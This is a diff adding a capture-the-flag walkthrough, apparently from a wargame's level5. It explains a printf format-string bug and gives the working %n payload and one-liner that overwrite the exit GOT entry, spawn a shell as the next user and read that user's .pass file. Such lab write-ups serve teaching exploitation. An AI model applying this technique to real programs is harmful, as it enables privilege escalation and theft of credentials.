@@ -2,3 +2,147 @@
 
 cat /home/user/level6/.pass
 
+================================== Level5 Walkthrough ============================================
+
+--- Protections relevant to this level ---
+
+No RELRO  → GOT (Global Offset Table) is writable
+            → we can overwrite function addresses in it
+No PIE    → binary addresses are fixed
+No ASLR   → all addresses predictable and hardcoded
+
+--- What the program does ---
+
+main() calls n() and returns.
+
+n() does:
+1. fgets(buffer, 512, stdin) → reads input safely, max 512 bytes
+2. printf(buffer)            → VULNERABLE → format string attack
+3. exit(0)                   → exits immediately
+
+The problem:
+→ there is a hidden function o() that calls system("/bin/sh")
+→ but n() calls exit() directly after printf
+→ o() is never called normally
+→ we cannot use a condition trick like level3/4
+→ we need a completely different approach
+
+--- Hidden function o() ---
+
+Found via "info functions" in GDB:
+0x080484a4  o
+
+Disassembled:
+   call system("/bin/sh")  ← opens shell
+   call _exit(1)
+
+Confirmed with:
+   x/s 0x80485f0 → "/bin/sh" ✅
+
+--- New concept: GOT overwrite ---
+
+GOT = Global Offset Table
+→ a table in memory that stores the REAL addresses
+  of library functions like exit(), printf(), system()
+
+When program calls exit():
+→ does NOT jump directly to exit() in libc
+→ first looks up exit's address in the GOT
+→ then jumps to that address
+
+Normal execution:
+   program calls exit()
+         ↓
+   reads exit@GOT → 0xb7e50c50 (real exit in libc)
+         ↓
+   jumps to real exit() → program dies ❌
+
+After our overwrite:
+   program calls exit()
+         ↓
+   reads exit@GOT → 0x080484a4 (our o() address!)
+         ↓
+   jumps to o() → system("/bin/sh") → shell! 🎉
+
+Why GOT is writable here:
+   No RELRO → GOT entries are not protected → we can overwrite them ✅
+
+--- Finding exit@GOT address ---
+
+ran: objdump -R ./level5
+
+output:
+   08049838 R_386_JUMP_SLOT   exit  ← this is exit's GOT entry
+
+exit@GOT address: 0x08049838
+→ this is what we need to overwrite
+
+--- Finding our input position on stack ---
+
+ran: python -c 'print "AAAA " + "%x " * 10' | ./level5
+
+output:
+   AAAA 200 b7fd1ac0 b7ff37d0 41414141 ...
+                               ↑
+                          position 4 = our input ✅
+
+--- The exploit strategy ---
+
+Goal:
+→ overwrite exit@GOT (0x08049838) with o() address (0x080484a4)
+→ when program calls exit() → redirects to o() → shell
+
+Using %n format specifier:
+→ %n writes number of chars printed so far into an address
+→ we need to write 0x080484a4 = 134513828 into 0x08049838
+
+Using %[number]x trick:
+→ instead of printing 134513828 literal chars (impossible)
+→ use %134513824x → only 12 bytes in input
+→ printf prints 134513824 chars worth of padding internally
+→ fgets sees only 12 bytes → no problem ✅
+
+--- Payload calculation ---
+
+address at position 4 = 4 bytes already printed
+need total chars:       134513828 (= 0x080484a4)
+padding needed:         134513828 - 4 = 134513824
+
+payload:
+\x38\x98\x04\x08  → exit@GOT address in little endian (position 4)
+%134513824x       → print 134513824 more chars → total = 134513828
+%4$n              → write 134513828 into address at position 4
+                  → exit@GOT now contains 0x080484a4 (o() address)
+
+total input size: 4 + 12 + 4 = 20 bytes ✅ well under 512
+
+--- Running the exploit ---
+
+(python -c 'print "\x38\x98\x04\x08" + "%134513824x" + "%4$n"'; cat) | ./level5
+
+note: execution is slow because printf prints 134 million spaces
+      but it works correctly
+
+cat keeps stdin open so shell stays interactive after exploit
+
+--- Execution flow ---
+
+printf reads our input as format string
+         ↓
+prints address (4 bytes) + 134513824 spaces = 134513828 chars total
+         ↓
+%4$n → reads position 4 → finds 0x08049838 (exit@GOT)
+     → writes 134513828 (= 0x080484a4) into 0x08049838
+         ↓
+exit@GOT now contains address of o()
+         ↓
+program calls exit(0)
+→ looks up exit@GOT → finds 0x080484a4
+→ jumps to o() instead of real exit()
+         ↓
+o() calls system("/bin/sh") → shell as level6! 🎉
+
+--- Result ---
+
+whoami → level6
+cat /home/user/level6/.pass → [password]
